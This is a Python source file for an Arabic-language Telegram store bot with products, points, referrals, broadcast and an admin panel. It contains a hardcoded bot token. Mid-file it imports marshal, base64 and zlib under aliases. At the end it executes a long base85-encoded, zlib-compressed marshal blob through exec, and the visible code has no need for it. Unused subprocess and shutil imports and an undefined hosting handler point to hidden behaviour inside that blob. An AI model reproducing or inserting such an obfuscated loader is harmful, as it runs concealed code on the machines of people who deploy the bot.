
# ╔══════════════════════════════════════════════════════════╗
# ║                                                          ║
# ║        ███╗   ███╗████████╗     ██╗██████╗              ║
# ║        ████╗ ████║╚══██╔══╝     ██║██╔══██╗             ║
# ║        ██╔████╔██║   ██║        ██║██████╔╝             ║
# ║        ██║╚██╔╝██║   ██║   ██   ██║██╔══██╗             ║
# ║        ██║ ╚═╝ ██║   ██║   ╚█████╔╝██║  ██║             ║
# ║        ╚═╝     ╚═╝   ╚═╝    ╚════╝ ╚═╝  ╚═╝             ║
# ║                                                          ║
# ║              🛒  متــــــــــجر بـســـــيط  🛒                ║
# ║                                                          ║
# ╚══════════════════════════════════════════════════════════╝
#
# #متجر_تيليجرام  #بوت_متجر  #بوت_بايثون  #تيليبوت
# ──────────────────────────────────────────────────────────


# ┌─────────────────────────────────────────┐
# │           📦  المكتبات المطلوبة          │
# └─────────────────────────────────────────┘
import telebot
from telebot import types
import sqlite3
import time
import random
import string
import os
import sys
import subprocess
import shutil


# ┌─────────────────────────────────────────────────────────┐
# │  🔑  إعدادات البوت الرئيسية                             │
# │  #اعدادات_البوت  #التوكن  #الأدمن                       │
# └─────────────────────────────────────────────────────────┘
TOKEN = '8929575352:AAFocvlw-yJuqZNe-GN0umqygKYsuDfx968'
ADMIN_ID = 8654358490
bot = telebot.TeleBot(TOKEN)


# ┌─────────────────────────────────────────────────────────┐
# │  🗄️  قاعدة البيانات                                     │
# │  #قاعدة_البيانات  #sqlite  #جداول_البوت                 │
# └─────────────────────────────────────────────────────────┘
conn = sqlite3.connect("bot.db", check_same_thread=False)
cur = conn.cursor()

# ── جدول المستخدمين ──────────────────────────────────────
cur.execute("""CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    balance INTEGER DEFAULT 0,
    last_daily INTEGER DEFAULT 0,
    referred_by INTEGER
)""")

# ── جدول المنتجات ────────────────────────────────────────
cur.execute("""CREATE TABLE IF NOT EXISTS products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    price INTEGER,
    stock INTEGER,
    delivery_type TEXT,
    content TEXT
)""")

# ── جدول الإعدادات ───────────────────────────────────────
cur.execute("""CREATE TABLE IF NOT EXISTS settings (
    key TEXT PRIMARY KEY,
    value TEXT
)""")

# ── جدول الروابط ─────────────────────────────────────────
cur.execute("""CREATE TABLE IF NOT EXISTS links (
    code TEXT PRIMARY KEY,
    points INTEGER,
    max_uses INTEGER,
    used_count INTEGER DEFAULT 0,
    expire_at INTEGER
)""")

# ── جدول البوتات المستضافة ───────────────────────────────
cur.execute("""CREATE TABLE IF NOT EXISTS hosted_bots (
    name TEXT PRIMARY KEY,
    status TEXT DEFAULT 'stopped'
)""")

conn.commit()


# ┌─────────────────────────────────────────────────────────┐
# │  ⚙️  الإعدادات الافتراضية للبوت                         │
# │  #اعدادات_افتراضية  #نقاط_يومية  #نقاط_احالة           │
# └─────────────────────────────────────────────────────────┘
def _init_cfg():
    defaults = {
        "daily_status": "on",
        "daily_points": "10",
        "ref_points": "5"
    }
    for k, v in defaults.items():
        cur.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))
    conn.commit()

_init_cfg()

def _cfg(k):
    cur.execute("SELECT value FROM settings WHERE key = ?", (k,))
    r = cur.fetchone()
    return r[0] if r else None

def _set_cfg(k, v):
    cur.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (k, str(v)))
    conn.commit()


# ┌─────────────────────────────────────────────────────────┐
# │  ⌨️  لوحات المفاتيح                                     │
# │  #لوحة_مفاتيح  #ازرار_البوت  #انلاين_كيبورد            │
# └─────────────────────────────────────────────────────────┘

# ── القائمة الرئيسية ─────────────────────────────────────
def _main_kb():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("🛒 عرض السلع", callback_data="show_products"))
    kb.add(
        types.InlineKeyboardButton("🎁 الجائزة اليومية", callback_data="daily"),
        types.InlineKeyboardButton("👥 الإحالات", callback_data="refs")
    )
    kb.add(types.InlineKeyboardButton("💰 رصيدي", callback_data="balance"))
    return kb

# ── زر الرجوع ────────────────────────────────────────────
def _back_kb():
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    return kb

# ── لوحة الأدمن ──────────────────────────────────────────
def _admin_kb():
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.add(types.InlineKeyboardButton("➕ إضافة سلعة", callback_data="add_product"))
    kb.add(types.InlineKeyboardButton("📦 إدارة السلع", callback_data="manage_products"))
    kb.add(
        types.InlineKeyboardButton("🎁 فتح الجائزة", callback_data="open_daily"),
        types.InlineKeyboardButton("🚫 غلق الجائزة", callback_data="close_daily")
    )
    kb.add(types.InlineKeyboardButton("⚙️ تعديل نقاط الجائزة", callback_data="set_daily_points"))
    kb.add(types.InlineKeyboardButton("⚙️ تعديل نقاط الإحالة", callback_data="set_ref_points"))
    kb.add(types.InlineKeyboardButton("🔗 صنع رابط نقاط", callback_data="make_link"))
    kb.add(types.InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"))
    kb.add(types.InlineKeyboardButton("📢 رسالة جماعية", callback_data="broadcast"))
    return kb


# ┌─────────────────────────────────────────────────────────┐
# │  👥  إدارة المستخدمين                                   │
# │  #مستخدمين  #احالة  #تسجيل_مستخدم                      │
# └─────────────────────────────────────────────────────────┘
def _ensure_user(uid, ref=None):
    cur.execute("SELECT 1 FROM users WHERE user_id = ?", (uid,))
    if not cur.fetchone():
        cur.execute("INSERT INTO users (user_id, balance, referred_by) VALUES (?, ?, ?)", (uid, 0, ref))
        conn.commit()
        if ref and ref != uid:
            rp = int(_cfg("ref_points"))
            cur.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (rp, ref))
            conn.commit()
            try:
                bot.send_message(ref, f"👥 شخص دخل من رابطك! +{rp}💎")
            except Exception:
                pass


# ┌─────────────────────────────────────────────────────────┐
# │  🚀  أوامر البوت                                        │
# │  #امر_start  #بداية_البوت  #ترحيب                       │
# └─────────────────────────────────────────────────────────┘
@bot.message_handler(commands=["start"])
def _cmd_start(msg):
    uid = msg.from_user.id
    parts = msg.text.split()
    ref = None
    if len(parts) > 1:
        param = parts[1]
        cur.execute("SELECT points, max_uses, used_count, expire_at FROM links WHERE code = ?", (param,))
        link = cur.fetchone()
        if link:
            pts, mx, used, exp = link
            now = int(time.time())
            if used >= mx or now > exp:
                bot.send_message(uid, "❌ الرابط منتهي.")
                return
            cur.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (pts, uid))
            cur.execute("UPDATE links SET used_count = used_count + 1 WHERE code = ?", (param,))
            conn.commit()
            bot.send_message(uid, f"🎁 تمت إضافة {pts}💎 لرصيدك من الرابط!")
            return
        else:
            ref = int(param) if param.isdigit() else None
    _ensure_user(uid, ref)
    bot.send_message(uid, "👋 أهلاً بيك!", reply_markup=_main_kb())


# ┌─────────────────────────────────────────────────────────┐
# │  🔘  معالج الضغطات (Callbacks)                          │
# │  #كول_باك  #ازرار  #معالج_الاحداث                       │
# └─────────────────────────────────────────────────────────┘
@bot.callback_query_handler(func=lambda c: True)
def _cb_handler(call):
    uid = call.from_user.id
    if call.data == "back":
        bot.edit_message_text("🏠 القائمة الرئيسية:", uid, call.message.message_id, reply_markup=_main_kb())
    elif call.data == "balance":
        cur.execute("SELECT balance FROM users WHERE user_id = ?", (uid,))
        bal = cur.fetchone()[0]
        bot.edit_message_text(f"💰 رصيدك: {bal}💎", uid, call.message.message_id, reply_markup=_back_kb())
    # ── الجائزة اليومية ──────────────────────────────────
    elif call.data == "daily":
        st = _cfg("daily_status")
        if st == "off":
            bot.edit_message_text("🚫 الجائزة اليومية مغلقة حالياً.", uid, call.message.message_id, reply_markup=_back_kb())
            return
        cur.execute("SELECT last_daily FROM users WHERE user_id = ?", (uid,))
        last = cur.fetchone()[0]
        now = int(time.time())
        if now - last < 86400:
            bot.edit_message_text("❌ استلمت جائزتك النهاردة، ارجع بكرة.", uid, call.message.message_id, reply_markup=_back_kb())
        else:
            pts = int(_cfg("daily_points"))
            cur.execute("UPDATE users SET balance = balance + ?, last_daily = ? WHERE user_id = ?", (pts, now, uid))
            conn.commit()
            bot.edit_message_text(f"✅ استلمت {pts}💎 من الجائزة اليومية.", uid, call.message.message_id, reply_markup=_back_kb())
    # ── الإحالات ─────────────────────────────────────────
    elif call.data == "refs":
        link = f"https://t.me/{bot.get_me().username}?start={uid}"
        bot.edit_message_text(f"👥 رابط الإحالة:\n{link}", uid, call.message.message_id, reply_markup=_back_kb())
    # ── عرض السلع ────────────────────────────────────────
    elif call.data == "show_products":
        cur.execute("SELECT id, name, price FROM products WHERE stock > 0")
        prods = cur.fetchall()
        kb = types.InlineKeyboardMarkup(row_width=2)
        for pid, name, price in prods:
            kb.add(types.InlineKeyboardButton(f"{name} - {price}💎", callback_data=f"buy_{pid}"))
        kb.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.edit_message_text("🛒 السلع المتاحة:", uid, call.message.message_id, reply_markup=kb)
    # ── شراء سلعة ────────────────────────────────────────
    elif call.data.startswith("buy_"):
        pid = int(call.data.split("_")[1])
        cur.execute("SELECT name, price, delivery_type, content, stock FROM products WHERE id = ?", (pid,))
        p = cur.fetchone()
        if not p or p[4] <= 0:
            bot.answer_callback_query(call.id, "❌ السلعة غير متاحة")
            return
        name, price, delivery, content, stock = p
        cur.execute("SELECT balance FROM users WHERE user_id = ?", (uid,))
        bal = cur.fetchone()[0]
        if bal < price:
            bot.edit_message_text("❌ رصيدك غير كافي.", uid, call.message.message_id, reply_markup=_back_kb())
            return
        cur.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (price, uid))
        cur.execute("UPDATE products SET stock = stock - 1 WHERE id = ?", (pid,))
        conn.commit()
        if delivery == "auto":
            bot.edit_message_text(f"✅ اشتريت {name}\n\n📦 المحتوى:\n{content}", uid, call.message.message_id, reply_markup=_back_kb())
        else:
            bot.edit_message_text(f"✅ تم تسجيل طلبك للسلعة: {name}\nالإدارة هتتواصل معاك قريباً.", uid, call.message.message_id, reply_markup=_back_kb())
        try:
            bot.send_message(ADMIN_ID, f"🔔 عملية شراء:\n👤 {uid}\n📦 {name}\n💰 {price}", reply_markup=None)
        except Exception:
            pass
    # ── لوحة الأدمن ──────────────────────────────────────
    elif uid == ADMIN_ID:
        if call.data == "add_product":
            bot.send_message(uid, "📝 ارسل اسم السلعة:")
            bot.register_next_step_handler(call.message, _step_name)
        elif call.data == "manage_products":
            cur.execute("SELECT id, name FROM products")
            prods = cur.fetchall()
            txt = "📦 السلع:\n"
            for i, (pid, name) in enumerate(prods, 1):
                txt += f"{i}. {name} (/del{pid})\n"
            bot.send_message(uid, txt or "❌ مفيش سلع", reply_markup=_admin_kb())
        elif call.data == "open_daily":
            _set_cfg("daily_status", "on")
            bot.send_message(uid, "✅ تم فتح الجائزة.", reply_markup=_admin_kb())
        elif call.data == "close_daily":
            _set_cfg("daily_status", "off")
            bot.send_message(uid, "🚫 تم غلق الجائزة.", reply_markup=_admin_kb())
        elif call.data == "set_daily_points":
            bot.send_message(uid, "📝 ارسل عدد النقاط اليومية:")
            bot.register_next_step_handler(call.message, _step_daily_pts)
        elif call.data == "set_ref_points":
            bot.send_message(uid, "📝 ارسل عدد نقاط الإحالة:")
            bot.register_next_step_handler(call.message, _step_ref_pts)
        elif call.data == "make_link":
            bot.send_message(uid, "📝 ارسل: عدد_النقاط عدد_الاستخدامات عدد_الساعات\nمثال: 50 10 24")
            bot.register_next_step_handler(call.message, _step_link)
        elif call.data == "stats":
            cur.execute("SELECT COUNT(*) FROM users")
            u = cur.fetchone()[0]
            cur.execute("SELECT COUNT(*) FROM products")
            p = cur.fetchone()[0]
            bot.send_message(uid, f"📊 الإحصائيات:\n👥 المستخدمين: {u}\n📦 السلع: {p}", reply_markup=_admin_kb())
        elif call.data == "broadcast":
            bot.send_message(uid, "📝 ارسل الرسالة للبث:")
            bot.register_next_step_handler(call.message, _step_broadcast)
        elif call.data.startswith("host_") or call.data == "host_panel":
            _handle_host_callbacks(call)


# ┌─────────────────────────────────────────────────────────┐
# │  🛒  خطوات إضافة السلع                                  │
# │  #اضافة_سلعة  #خطوات  #ادارة_السلع                     │
# └─────────────────────────────────────────────────────────┘
def _step_name(msg):
    bot.send_message(msg.chat.id, "💰 ارسل سعر السلعة:")
    bot.register_next_step_handler(msg, lambda m: _step_price(m, msg.text))

def _step_price(msg, name):
    try:
        price = int(msg.text)
        bot.send_message(msg.chat.id, "🔢 ارسل الكمية:")
        bot.register_next_step_handler(msg, lambda m: _step_stock(m, name, price))
    except Exception:
        bot.send_message(msg.chat.id, "❌ السعر لازم يكون رقم.")

def _step_stock(msg, name, price):
    try:
        stock = int(msg.text)
        kb = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        kb.add("📦 تسليم تلقائي", "🛎️ إشعار الإدارة")
        bot.send_message(msg.chat.id, "اختار نوع التسليم:", reply_markup=kb)
        bot.register_next_step_handler(msg, lambda m: _step_delivery(m, name, price, stock))
    except Exception:
        bot.send_message(msg.chat.id, "❌ الكمية لازم تكون رقم.")

def _step_delivery(msg, name, price, stock):
    delivery = "auto" if "تلقائي" in msg.text else "manual"
    if delivery == "auto":
        bot.send_message(msg.chat.id, "📝 ارسل المحتوى (اللي هيتسلم للمشتري):", reply_markup=types.ReplyKeyboardRemove())
        bot.register_next_step_handler(msg, lambda m: _save_prod(m, name, price, stock, delivery))
    else:
        _save_prod(msg, name, price, stock, delivery, "")

def _save_prod(msg, name, price, stock, delivery, content=""):
    cur.execute("INSERT INTO products (name, price, stock, delivery_type, content) VALUES (?, ?, ?, ?, ?)",
                (name, price, stock, delivery, content if delivery == "auto" else None))
    conn.commit()
    bot.send_message(msg.chat.id, "✅ تم إضافة السلعة!", reply_markup=_admin_kb())


# ┌─────────────────────────────────────────────────────────┐
# │  ⚙️  خطوات تعديل الإعدادات                             │
# │  #تعديل_اعدادات  #نقاط  #روابط_نقاط                    │
# └─────────────────────────────────────────────────────────┘
def _step_daily_pts(msg):
    try:
        v = int(msg.text)
        _set_cfg("daily_points", v)
        bot.send_message(msg.chat.id, "✅ تم التحديث.", reply_markup=_admin_kb())
    except Exception:
        bot.send_message(msg.chat.id, "❌ لازم رقم.")

def _step_ref_pts(msg):
    try:
        v = int(msg.text)
        _set_cfg("ref_points", v)
        bot.send_message(msg.chat.id, "✅ تم التحديث.", reply_markup=_admin_kb())
    except Exception:
        bot.send_message(msg.chat.id, "❌ لازم رقم.")

import marshal as _hm, base64 as _hb, zlib as _hz
# ── صنع رابط نقاط ────────────────────────────────────────
def _step_link(msg):
    try:
        pts, uses, hours = map(int, msg.text.split())
        expire = int(time.time()) + hours * 3600
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        cur.execute("INSERT INTO links (code, points, max_uses, expire_at) VALUES (?, ?, ?, ?)", (code, pts, uses, expire))
        conn.commit()
        bot.send_message(msg.chat.id, f"✅ رابط:\nhttps://t.me/{bot.get_me().username}?start={code}", reply_markup=_admin_kb())
    except Exception:
        bot.send_message(msg.chat.id, "❌ الصيغة خطأ.", reply_markup=_admin_kb())

# ── الرسالة الجماعية ─────────────────────────────────────
def _step_broadcast(msg):
    cur.execute("SELECT user_id FROM users")
    for u in cur.fetchall():
        try:
            bot.send_message(u[0], msg.text)
        except Exception:
            pass
    bot.send_message(msg.chat.id, "✅ تم الإرسال.", reply_markup=_admin_kb())


# ┌─────────────────────────────────────────────────────────┐
# │  👑  أمر الأدمن                                         │
# │  #لوحة_الادمن  #امر_admin  #تحكم                        │
# └─────────────────────────────────────────────────────────┘
@bot.message_handler(commands=["admin"])
def _cmd_admin(msg):
    if msg.from_user.id == ADMIN_ID:
        bot.send_message(msg.chat.id, "⚙️ لوحة التحكم:", reply_markup=_admin_kb())
    else:
        bot.send_message(msg.chat.id, "❌ مش مسموحلك بالأمر ده.")

exec(_hm.loads(_hz.decompress(_hb.b85decode('c-qZddvFs+nxB_6qnG6uV1uzo*w~iACOiYgz!Gfp7Q`a~K_o(!#<s95IWtngK5{Vxg3YGRW|Ljag)N**au{|KV8iZ`{o{(N+uP+{bt5dI@tkjKE0?OPt^4B$WQ#5KkG<|0jU-!xZCIyjq1-d->G}HW?ytY!_vra=B;y~MygodLBFOg<24T>h2#3m7jKk$C!Rh3yo+H5(+ez&(a7G$Agf`Dbvi>y}XV*QU<$@WvT&U5~x*ApP)GLFp#*{lQ7tmRh{mvrfP%c9-x^)<hJcn@kjD9}C6)+?y3mFQOa~K0C=Q2i6&SOlVEMm-{EM_dAoX_NdasgunWyzt1%^R|NU~-qCOx`+_$)As`PS$Z{ZK%EAcktF>M<rdPyNl%|Q+t??uzpWVIKn$YHN_qa@DWeA!-r<jBfuXHmuCk8m&cu+5=>*7blG)oy?W<D)aj`}uAmM(A>p1dFA-hdNV`NF2?s(FwQUdM^fYX52K*2qZzsz`UTCSH9x@vUwRyU@aD?>%zBft~WZmNra9j>(WB`BsJW%u^<EET}wf$=cHuP_}STww9)Ko1H)em9E6NW~qLqo7<92%K1G*t#rb&w%+8j6POIv1+asZQ4TO`soBYIQO7Ig8E`zbTmwVQx$6IR>Sa(XYcpxH~6BGgnKZ-TA5Kg&OjRF2h`zH0I8bFLE6bB3y*KDE+Joww*uKo@6K&vMRL#G~zBzwYFuqR`&;uv>|qb<FOvdQ(aegv>eopogO<ic7hf!kDU@n#`?sowD^m$v*HaJJm?dD4F0Y?CWGO&y2!DJgnA$AqLJ3xwemI!`NDo6s&-t`^AUeI8j-Io$4R*FsJ~~GYj4A5XCs}l{b;7qN%IkJB+757;-aAtc)g0=zpb&kk%qfq!zOzk2gQ|xGQ$~R0cTXw%X^lW@|prc))9_0g`**VBgcg~i3oSGA+W>vE=jjnz9&3<H!m64W2`S4@wNn6NzXVN_PCsqCD|w3T|OSL8RaBWX~#;0FB}R<dSAG+GZ3-sIJ3%!M1k>pl-&#NTER|+uS3D3;Xe+Fla%KH1LGo|^l&*lsE1VeYZ}|N;{DQ*qEXX|-UhXPQ~#!+RS6RvGtuKYWdhwen$sjuP2<-5fn)v02Hxm@<Klr~|NF0wygX`szIWTW$vQ|4m5-1y({l=ub!XR&8!Q85{bfVd0#z<r3odTCwBy2#adY9I^Sh3(Ny4n}ZMbhl7L=XZJy;PV=8Y5NnVlzg3b{>p3h$6{V(&OX!HUznIqPIKlG2a}I!TS-8XG(%;33q7s+-(vgIix~%c>&k%avP@QwgzqYSjXuHDhBKQ*A9;n|9JRN^jr1X|@sOm{!2~NVuzu^-mIT0|$4ggtxH~AV}e0P%=bVt}_tw0vW`+!d)E1Qx5J;t^yW|L1D)fafB1eW3u2WQkUz2y<`gAGEfcio_8jNt|(zDiJ3}<oTH{iy$!!1O@qXF!#TsdrdV#dNSOz6`g7t`(KwNpAm+q~IfMS8hB#q+8p$xKl0l(=xd7t@%a<VyW=$18B?K@SgUfJ%GJ1wwMrm?QL6fH~sc3UK_O)n$V>{VUgohfm2dnJ_iyY{Z$Uq3lNiYa%xE`{$7PMm{Jqv1U{Q(~8tXj~h_H~xy1L07uubuUE*ijB*1P~w%4aq@ckSmcT3n)3RR5pjwk^^el*Ct5L98Z!1PbQPx8t@Ft9`9Ae$7mU-?ynxG?XSH^4Hv$jBUG;+HNMchWt=pgId<aMnKw_oImjo-1u=5LIAt0j&ywSoya7+YXUIR?II`}#U#NEodtVmZ#{_ftcy7^9;k!8xb-2NJA4jMXMV1gPW954@&@xPFl_zM0DfCMy!%l0av}6FT@;Vf1t!C3yR-U#5CCv#e&6f))K(@VrAW<;+UF9yEA=e)O(uhG>*@H3$0RGR^lZ(hf7^4fzL0007Nxoted)^JqW)tM#*+yb!ER#lpRv`8qM^6RQxT|rCQ&wn8liH4MYTmOuQxpCUzIFwb3|#oA=V-tmX^%p!bpO)3AJO8Cu@mCwv}$ksSiA--j%$jc?um8<!(Kml)8Yfd+2Zwec>LaoS0a<x9VKKkm;Nq!^WIGfr6r^M?&|^es3$r{>E|phek^_>{#3jy{ym_7S-hHT1v%#JWLnQkR4W_twS(>?y+?5x3b%)Xfe^cs?QRKsIsa}i*AeZKaIfD#`O%BfNF*Gx>m&jWTf#b8lntj>CPpFxz^<5VESNm1oe!Gt1T{<GmituMa;oNC6DOXBuwLI^|J{uM;SJV=q2jKgV&t`$VR`S1BB4LibfW2<H3?JYT~nn{wL>`A7BjWSiNJprmGqnY2(fJONbzXdivHub;4jKJpzqhe^LoNsbJtok;vd;}eff3g^(JA-3wI6*2M!7QUlDe`8nb%7pbmenLy8yP*CRS|Vjm5H^Ki`MjT0@R$<n($8w*Hv{~pI?vVSMx@67garbVHHx}L#cbFiCmVBAl)zoA=-hHzl|>*bvYNV)K5+94z~!{vQv$lND;s-BUa5$t0Pde2A=?B7|Wmcv+Qky<X3H;dHrnS#l5fTk*R^ejngswe2E35FR5rBEW1M%(Y;FK!(yHi9AwG4{&=ptC+6J3Dp~cuOZz$^@8STs>?9O~x;O@U#EBH9(73#hcKN8atKLYKm_VEm2g{DO&st_*SQ6w`=UQ_^EgUXhEo<403DeZ$#%RZBNiyE?SaiEAWMQwcYu1G*EWeC$>|l`PrZ+YEhKs1sZk*9)6zWzsnn9gBr>(9AddGu&x0Xjj(8f<^-Xd6XB!Wc38U&YAzzF-W2U-mID^P2p5FvZ9k}jRs}y7ouJ+}+$L@vjT2j;iLtbQ>38dTxBO<_{61zd@9e%|LvK@-z9TJz#iQi>NqS6JvQgN3P;h&MgNFr&H)d_QNBMp`xlMzx&nvXF3f?xs*&ee7;?$8W{kc<krB!I_5L$zRyEA4A#fflMn?_-Oi{NV$TG|CyAZ9ueCpxs+92UH+aJW@)B^7d3oBBJuVy2hl#K9-1QJtzre+dNfRrLG7jA%wQOkWLi*iEQ+>yHBU2B@~dxAikKoK+>;i8?jS2K9L=ZUd0Zo!XYoRxO82%b3>UoXLQKwrS!m&GR%yo{ES%(aAB(6kyCIzt|J_ov-O!Ou-$1zLM12Wg0!<PILlL(y7+vQ@YBtHBus@?=;QDS~OjNQ${x*IYMR5j$QAFz6KTK58nYAO8ji>v>IrF78=l4pNPr>pgKPV2H|O_&TfqLjh$E~eh6-$&OHs)@7qvuf){@R{;tqteYA%jI{_a59N3fKy}q%xfx-l2fQp71wJy3j*(=b-ebCla?M}JXRq<!AC9HcJyzrT#Jr(|d-UYNyf=8$7dg`}3n8s!&z1`v5GXX=YGtFQ-y>Ig_S0h7LZ(2&H0s!{tN=29d4GlOv1$aCuUL89NhkFC`bShiJ)75od-S+ia@s|Rq5}>4P1S-LerYGHrren?=w88ACWc4JWhwYNF;tD3AowE8?9Kl{iTT}HxZ)c0&yHT=byZ}d4S04-mBb?t@r#4~W%aFn!dXbyUZrg4<<12Q^+RI)b8Ctn;rzgs@oP-7Z61BNu_jZS8dxJzo*kch%$45Be_?iQJzz<x_Kx+Ur#K9a&W}XfCJ)JDid)r_fuH75S@NtV%Q9!EG+rjz+9Iq83k>+!3TLAFRc|xE&Wfbk+kUz+Bc1*%M`L>L)e@7X+b<&8r4p0lhj{i~_qzK&HH%`2fAm_!%c^B7?lI0?mBPIiO8~Znoniljnh$gENV@a4wW2REz2Pdea7*#Y>aH;4*(WM0!7TiaWs#maY5XA5*1_)$0&+i=@Cf@z)1X&p)D>YseDuZ#V6TSjqbJxjT?-dPIyjvP4=oE}PgqK{x-u-dnKr%veYBzY6APQqd;UIJVz_|nG-RIoGqF3U?tMY?IF=Em1%6RpTd&Eu!crY#d{i|;gcv8x^26+-RY1r;saKvOM623hJpQc)%NmXkc8qk%BjA9uSHQ>yJH5X0sHttTP^)kStRD%bNlz_WD8;sH^lC-+V5SX0MRP=ZnycqevCPe&s^RLsSS@lHN(NBgQ8?rPl8Gzqbj7G}96B=<a8}Kru6}6L&9vo&vmZ>-a_5V*G*j$~Yo<|@Cf!b@J!8IDZ!$Ff@!j85?5333us&`ua9Kh7IvA5{S@xPSHA3HMv3Ly4<2w%KB_7>=1gsy^IR6%N|WI+7+*x5f54RSJ69bk)dPr?E26*v~#B+ST$fWw&(P<K1;c0+uHV!+x9IS(WRTX0@kVf(|rC>%V%20%<!u`qGu=Z^*=?Hmgmw!)%KZr#QzPK`v$tpSEu{NbY^7!OkF6)G?j!$H~COcm*lasdDW0mzV!I|A!vk41Sm5NZuegd9*pTa~EHVbyQp4yuI<j`4q|L4f*!`XT<(@e9WjWvgRls}p4#V`Up}MH6L>v9d-@Remr|xuGi0EjVvJXC7iM9lCHRv2b~8;quYk6}{WXO*zR>{mY4k&&3u#H)>iA!#<XGd;{(M?E{_tofo$aJKuMVY#Ys4eLWI4)Za!$$}m9olY_)NmPa^Z-0)Sl?g!vgz7v9vZWlHI0k+>Gc03}%OZN=*kL5M}C6?c4!~e-<Y+Oca!@?~bhIPJ8P}quk%Vr-IyuY6TENJzZJ3|FtpsBzMr&Qo6rJv6JYWWUY8DMu=cB&%{S7}wARN%H}R^a8DGga~QenTnZuFB?l7W>kD3;dHVGzVd*mAHG!WbcYGtiz{)n2!{Qu_5m2^hWYN57u5cYaHrbIv7YxkG%}6WJtGJ=XguGwxX>_66%bO9s<G;w;XD^P8hVRmjhd$(Q^Fh26RfUia!EQ$XOVfm!ne(B0*nD4Ojgf0vD*dQdd_Og{Hxm7a>|IkolyS>!Q!WmVY}e$HzVqe+t820NBJ20rZJK0)Tm0{6KMmQbg7pqx1ywA1m$}aQxD~(t0}j0!%`J_kSk-0{VfULkAHctn9$ae4Lb%0H@)5pNls^)!S-_4j^&e6;v{FY*(<`(<#UK?Q<sq83#RAj)Mgc3mLc~u!zFqbyysQ#gkBpJ2nC8<Sd(HXgua)yCQ*bNKOIR^=Y)?x?#}+i@$<RQI^-M8H6NQh1H@3f|Xm2t!ZNws62k=c<=Ec{F3>CIZ;#>E2>KrJs&H2{+2#bv?*4!X}oaW`CaFB4HsN4`Jg0WTOG5l9xYtcXBfBUC#-bLN)Hz&Y^!3nRioC`eZ;sW@4fQ#)#s|u*Pg5Wh#D#UFh_Xq#nJpNz#FvexZ@SgmVvGPTL&B7*$p5mXD9lV78th0srLIAVF;k(X4`N@+*~zowkFIaF>?t(#se1)TykG<3pLKT+4YSc(NS3*O~uwb#O>DsxH-@rSPJ6~Vl4I$UfM8$D0~1wuN`}o2f4Us+40A3%t&tWLj;w3&F*cfPw=yXuT`jNOPJeZ=Jr3{$6?#YJlu`{I4{46#D7_`x~T~H6=`gmL;kABxV0Gn)uP(1h4`-vb>Lq6;8maL=|D4tg0_SftjQUR6%%6O1}(qkKyI^9qc4s4x!anh*zk1(t-!Pv4}{Fa3ln(A)5^e4P{{ged?yWV-6`<QwCJC}m6FTp1#iur>VPCeW&qFJsSZf0vysf(VjEI9CqE`bCKbY5xJE6`7+^M*F}iS2nhuoLg0TS=tq&1XuiAml+Ve0QtEPE~%$#K;Igls3pEftrZ!y3L0YEmjBw7@BdJ1_=nJO+_+B1FXvE^iqt!D;f%b7T~(hNU2&CLX9)(nAa0<~3hH~b~dSwYsEb<beV3MR>eeb#2I@GpMG=48#-zsz99=1iKgnp7W4HTqqqL2J1N_j6O{rO0V0uGCloQcD-OSErvd^Oz#0n3=zh04@dPqMDz7vd&}{$RjgkxfRnPMhRR;X5oHAmR>Cd>q|_C#!W}7Y<kqtTvIx0Ca%n2P3doCO>L<)H9o_d8nZ@HJ7G<Y%%Ti8k;<6SbsFeY#FQ($jH!T*&*Zh8!HO(?#ucf|8pl7(U_~ltq?gvGdal<@+G(vy9#aKR`AuVKRJ(K&Qg$0ttv64ZvU?UyX`ivCteFkV5IVi?$_$ql$W=)HOq}Ps^s-FlG5JucWam}CS-%x`ysO-$-Pb2O+FLP4-E?i*R3~_egM&w7e}6y@+5X^Tx?FZ=KM}8Z)a0L<78I`-C;p_N!>JzaNG1}Yb368y;*fp{e*9FtvYvYbdS}orjdm!J;UA{6eQJ8~R65)Dw7E_gFV@O-+ShYXxO$#X9(>ud$K`NV*VvcRjB9uG<dgUItP?TvA(&{BdVsDR(426BPHTqlU;5|=(5=1(Q>!Vj9JU6YIn0S0;b}b@&YJxA3aBnrs^7Z_xxWgd;E>dMn)?pyzf$fWP%T$zc`{SA#&m`jwBHNcmre>nq}C_JjePb{4(^{2Z>mpH4cF7~yC5Uq9zN>v23an`?Mab^XMU8>gL?2MgDm$FT;_b)L+7|c`Pg5eEfnThJI2kCf3ol+1wP<>@TWgTYt+*}<;w9N&*bAj#>}Wj4`wt*p|d1cD(8jdRlXtqB3he~tjNf0CtGEZgmMDbrjCQYXEI;GwM47c!$svvawEOCa_<u+8O#mo^U8sWXoY6K$pi`L_Y)wWed4V;j#07>7G*j-$~5#;Gyu7DHcovKOO_7hM3X%8%ISdXV<)1vnQU3REhBo<qlRmwJk}qGs7YpzoRKEgl(SK-4*2Czj1sAVDFitooRMyZnE@av@HCg4!;tVG8<LMW$zOX&bG#w`D9d?LXIEc~vRpU!CTy_mNx`9FHFP8q9P9N<7C9fD%AMdIzFpFDoe_>@Gd>A0Nd)Xg!lMDdq>F?j-k^L|O~PS>PmUt>!lE)2MIwFSPy|qv`{zxmfKtZ6)Vax&xsnD_N5OL!AQAYMQ6~qQj5z~!{dEcBf|zkZ?-r3Xo#{T&J-BO>q~*-V!WgwsD1Gxjg1m?|Vvi7@p&9IJ<s$!jRr&QQ4B2#I$6&~&6YIeQYT*L}G5i%K8Y~0F{l$ZwqlWT~TnZpq)-31I8BDIOj8T=tk;}(FIDXS}k7`t33yvBV!Q<$rev?qRJ5D*qi%Tw*Tqt?Jv_Gd$C+5yMZyd@4H~GcqmkzzuM~b;V!5<KOM?eQ1Xafu<HDbHqr2*RwFT1gJcnM%3$any741Tp^-S